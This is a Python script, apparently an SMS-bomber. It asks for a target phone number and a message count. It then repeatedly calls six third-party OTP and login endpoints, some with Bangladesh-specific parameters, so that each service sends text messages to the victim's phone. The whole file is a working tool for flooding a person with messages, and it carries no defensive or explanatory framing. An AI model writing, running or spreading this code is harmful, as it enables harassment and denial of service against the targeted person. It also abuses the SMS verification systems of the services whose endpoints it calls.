# Import Modules
import requests
from colorama import Fore
from banner import *
from APIs import APIs

if __name__ == "__main__":
    # Banner
    scriptBanner()

    # Get Input From User
    try:
        getTargetNumberFromUser = input(f"{colors[2]}Enter Target Number : ")
        getMessageAmountFromUser = int(input("Enter Amount : "))
    # Handle Exception
    except Exception as error:
        print(f"{colors[0]}An error occurred : {error}")
        exit()

    # Call CaseInsensitiveDict Function From Requests Module.
    requestFunction = requests.structures.CaseInsensitiveDict()

    # Post Request Variables
    oneVar = f"phone={getTargetNumberFromUser}"
    twoVar = f"{APIs[1]} {getTargetNumberFromUser} &platform=app&activity=login"
    threeVar = f"{APIs[2]} {getTargetNumberFromUser} &operator=bd-otp"
    fourVar = {"mobile":"' + getTargetNumberFromUser + '"}
    fiveVar = f"msisdn={getTargetNumberFromUser}"
    sixVar = (
        '{"phone":"'
        + getTargetNumberFromUser
        + '","country_code":"+880","fcm_token":null}'
    )
    requestFunction["Content-Type"] = "application/x-www-form-urlencoded"
    requestFunction["Content-Length"] = "0"

    # For Loop
    try:
        print("\nSending Message, Please Wait...")
        for i in range(getMessageAmountFromUser):
            i = i + 1
            requests.post(APIs[0], headers=requestFunction, data=oneVar)
            requests.post(
                twoVar,
                headers=requestFunction,
            )
            requests.get(threeVar)
            requests.post(APIs[3], headers=requestFunction, data=fourVar)
            requests.post(APIs[4], headers=requestFunction, data=fiveVar)
            requests.post(APIs[5], headers=requestFunction, data=sixVar)
        if i == 1:
            print(f"\n{Fore.GREEN}You Succesfully sent {i} message.")
        else:
            print(f"\n{Fore.GREEN}You Succesfully sent {i} messages.")
    # Handle Exception
    except Exception as error:
        print(f"{colors[0]}An error occurred : {error}")

    exit()
